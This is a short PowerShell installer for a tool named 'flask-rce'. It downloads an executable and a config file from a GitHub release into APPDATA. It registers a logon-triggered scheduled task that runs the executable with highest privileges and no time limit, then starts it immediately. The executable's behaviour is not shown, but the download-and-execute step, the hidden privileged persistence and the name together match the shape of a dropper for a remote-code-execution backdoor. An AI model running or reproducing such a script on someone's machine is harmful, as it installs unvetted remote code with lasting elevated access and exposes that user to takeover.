$installDir = "$env:APPDATA\flask-rce"
$taskName = "flask-rce"

Write-Host "Installing flask-rce..."

New-Item -ItemType Directory -Force -Path $installDir | Out-Null

Invoke-WebRequest -Uri "https://github.com/DapperPixelGuy/flask-rce/releases/latest/download/app.exe" -OutFile "$installDir\app.exe"
Invoke-WebRequest -Uri "https://github.com/DapperPixelGuy/flask-rce/releases/latest/download/config.yaml" -OutFile "$installDir\config.yaml"

$action = New-ScheduledTaskAction -Execute "$installDir\app.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null

Start-ScheduledTask -TaskName $taskName

Write-Host "Done."
